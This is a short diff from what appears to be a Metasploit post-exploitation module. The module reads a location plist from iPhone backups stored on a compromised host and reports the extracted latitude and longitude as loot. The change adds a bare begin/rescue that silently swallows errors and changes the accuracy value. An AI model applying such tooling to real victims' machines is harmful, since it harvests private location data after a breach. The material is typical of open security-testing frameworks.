@@ -173,15 +173,18 @@ class Metasploit3 < Msf::Post
 
 		ctype = "application/octet-stream"
 		file_loc = store_loot("ios.backup.alarmclockmagicfree.plist", ctype, session, fdata, "alarmclockmagicfree.plist", "Alarm Clock Free Plist")
-		plist = CFPropertyList::List.new(:file => file_loc)
-		data = CFPropertyList.native_types(plist.value)
-		lon=data['geomint_lon']
-		lat=data['geomint_lat']
-		acc="1.0"
-		pos = Position.new(lat,lon,acc)
-		comment = "Alarm Clock iPhone Backup @ Host: #{session.session_host}"
-		report_results(pos,"msf_mobilescrape",comment)
-		print_status("Location Found in Alarm Clock Free: #{lat},#{lon}")
+		begin
+			plist = CFPropertyList::List.new(:file => file_loc)
+			data = CFPropertyList.native_types(plist.value)
+			lon=data['geomint_lon']
+			lat=data['geomint_lat']
+			acc="100.0"
+			pos = Position.new(lat,lon,acc)
+			comment = "Alarm Clock iPhone Backup @ Host: #{session.session_host}"
+			report_results(pos,"msf_mobilescrape",comment)
+			print_status("Location Found in Alarm Clock Free: #{lat},#{lon}")
+		rescue
+		end
 	end
 
 	def process_backup(path)
